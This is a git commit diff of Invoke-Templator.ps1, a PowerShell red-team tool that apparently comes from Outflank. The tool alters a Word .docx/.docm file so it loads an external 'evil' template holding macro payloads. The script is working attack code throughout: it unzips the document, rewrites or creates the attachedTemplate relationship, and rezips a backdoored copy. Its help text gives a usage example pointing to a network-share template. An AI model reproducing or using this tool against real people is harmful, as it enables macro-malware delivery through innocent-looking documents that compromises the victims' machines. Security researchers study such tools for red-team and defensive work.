c230da3cbfa0c42ec2f3b657b77b61a98221de4e
Stan <stan@outflank.nl>
2019-10-15 11:28:01 +0200

    Update Invoke-Templator.ps1

--- Invoke-Templator.ps1
+++ Invoke-Templator.ps1
@@ -1,122 +1,107 @@
-﻿<#
+<#
     Invoke-Templator.ps1
-    Author: Pieter Ceelen (@ptr_cln)
+    Author: Pieter Ceelen (@PtrPieter) / Stan Hegt (@StanHacked)
     License: BSD 3-Clause
 
     Goal: Update Template location in Word files so we can mess around with macro payloads. 
     Presented at the MS office magic show @Derbycon 2018, additional details on https://www.outflank.nl/blog
-
-    Either load module and run the InjectTemplate function, or direct from the CLI using the -run parameter
-    ./injectTemplate.ps1 -run -templatefile \\file\share\empty.dotm -docfile e:\legit.docx
 #>
 
-
-Param
-    (
-          [String] $templatefile,
-          [String] $docfile,
-          [String] $temppath = $env:TEMP,
-          [switch] $run
-    )
- 
-
-
-
-function unzip {
+function Invoke-Unzip 
+{
   [CmdletBinding()]
     param([string]$FileName,[string]$TempDir )
 
-    Add-Type -Assembly “system.io.compression.filesystem”
+    Add-Type -Assembly "system.io.compression.filesystem"
 
     [io.compression.zipfile]::ExtractToDirectory($filename, $tempdir)
 }
 
-function  zip{
+function Invoke-Zip
+{
  [CmdletBinding()]
     param([string]$FileName,[string]$Dir )
 
-    Add-Type -Assembly “system.io.compression.filesystem”
+    Add-Type -Assembly "system.io.compression.filesystem"
 
     [io.compression.zipfile]::CreateFromDirectory($Dir, $FileName)
 
 }
 
-
-function Invoke-Templator {
-
-
-    Param
-        (
-              [Parameter(Mandatory=$True)] [String] $templatefile,
-              [Parameter(Mandatory=$True)] [String] $docfile,
-               [String] $temppath = $env:TEMP
+function Invoke-Templator 
+{
+<#
+.SYNOPSIS
+Update Template location in Word files so we can mess around with macro payloads.
+.DESCRIPTION
+Presented at the MS office magic show @Derbycon 2018, additional details on https://www.outflank.nl/blog
+Author: Pieter Ceelen (@PtrPieter) / Stan Hegt (@StanHacked)
+.PARAMETER docFile
+The .docx or .docm file to backdoor
+.PARAMETER templateFile
+Full path of evil template.
+.EXAMPLE
+PS > Invoke-Templator -docFile c:\temp\innocent.docx -templateFile "\\server\share name\evil.dot"
+This will set evil.dot as a default template for the file innocent.docx.
+.LINK
+https://www.outflank.nl
+.NOTES
+None
+#>
+    [CmdletBinding()] Param(
+              [Parameter(Mandatory=$True)] [String] $templateFile,
+              [Parameter(Mandatory=$True)] [String] $docFile,
+              [String] $tempPath = $env:TEMP
         )
  
-
     $rnd=Get-Random
 
+    $newdir = New-Item -Path $tempPath -ItemType "directory" -Name $rnd
 
-
-    $newdir = new-item -Path $temppath -ItemType "directory" -Name $rnd
-
-
-    if ( !(test-path $docfile)) {
-     write-host "unable to find file $docfile"
-     exit
+    if (!(Test-Path $docFile)) {
+		Write-Host "unable to find file $docFile"
+		exit
     }
 
-    $ext=$docfile.split(".")[-1]
+    $ext=$docFile.split(".")[-1]
     if($ext -notin "docm","docx") {
-     write-host "please provide a docm or docx as input docfile, not an $ext" 
-     exit
+		Write-Host "please provide a docm or docx as input docFile, not an $ext" 
+		exit
     }
 
+    Invoke-Unzip -FileName $docFile -TempDir "$tempPath\$rnd"  
+    $xmlfile = "$tempPath\$rnd\word\_rels\settings.xml.rels"
 
-
-
-    unzip -FileName $docfile -TempDir "$temppath\$rnd"  
-    $xmlfile=  "$temppath\$rnd\word\_rels\settings.xml.rels"
-
-    if ( (test-path $xmlfile)) {
+    if ((Test-Path $xmlfile)) {
         Write-verbose "xmlfile does exist"
 
-        [xml]$xmldata= get-content $xmlfile
+        [xml]$xmldata = get-content $xmlfile
         $curTemplate = $xmldata.Relationships.Relationship.Attributes['Target'].Value
-        write-host "File $docfile already has an template attached, updating"
-         $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templatefile"
+        Write-Host "File $docFile already has an template attached, updating"
+         $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templateFile"
          $xmldata.save( $xmlfile)
+    } else {
+        Write-Verbose "xmlfile is not found, creating a new one in $xmlfile"
+        [xml]$xmldata = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///F:\pieterisdebeste.dot" TargetMode="External"/></Relationships>'
+        $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templateFile"
+        $xmldata.save( $xmlfile)
 
-
-    } else{
-        write-verbose "xmlfile is not found, creating a new one in $xmlfile"
-        [xml]$xmldata='<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file:///F:\pieterisdebeste.dot" TargetMode="External"/></Relationships>'
-        $xmldata.Relationships.Relationship.Attributes['Target'].'#text'="file:///$templatefile"
-         $xmldata.save( $xmlfile)
-
-        write-verbose "xmlfile was not found, adding a reference to our template in word\settings.xml"
-         [xml]$settingsdoc= gc "$temppath\$rnd\word\settings.xml"
+        Write-Verbose "xmlfile was not found, adding a reference to our template in word\settings.xml"
+        [xml]$settingsdoc = gc "$tempPath\$rnd\word\settings.xml"
         $child = $settingsdoc.CreateElement("w","attachedTemplate","http://schemas.openxmlformats.org/wordprocessingml/2006/main")
         $atr = $settingsdoc.CreateAttribute("r","id","http://schemas.openxmlformats.org/officeDocument/2006/relationships")
 
-        $atr.value="rId1"|Out-Null
+        $atr.value = "rId1"|Out-Null
         $child.Attributes.Append($atr)|Out-Null
         $settingsdoc.settings.appendChild($child)|Out-Null
-        $settingsdoc.save("$temppath\$rnd\word\settings.xml")
-     
+        $settingsdoc.save("$tempPath\$rnd\word\settings.xml")
     }
 
-    zip -Dir "$temppath\$rnd\" -FileName "$temppath\$rnd.$ext"
+    Invoke-Zip -Dir "$tempPath\$rnd\" -FileName "$tempPath\$rnd.$ext"
 
-    write-host "created file , now manually run copy '$temppath\$rnd.$ext' '$docfile' "
+	$baseName = [System.IO.Path]::GetFileNameWithoutExtension($docFile)
+	Copy-Item -Path "$tempPath\$rnd.$ext" -Destination "$baseName-$rnd.$ext"
+    Write-Host "Created file $baseName-$rnd.$ext"
 
-    remove-item -Path "$temppath\$rnd\" -Recurse
-}
- 
-if($run){
-    if($templatefile -and $docfile ) {
-        injecttemplate -templatefile $templatefile -docfile $docfile -temppath $temppath
-    } else {
-        write-host "Error  docfile and templatefile are mandatory when calling with -run"
-        exit
-    }
+    Remove-Item -Path "$tempPath\$rnd\" -Recurse
 }
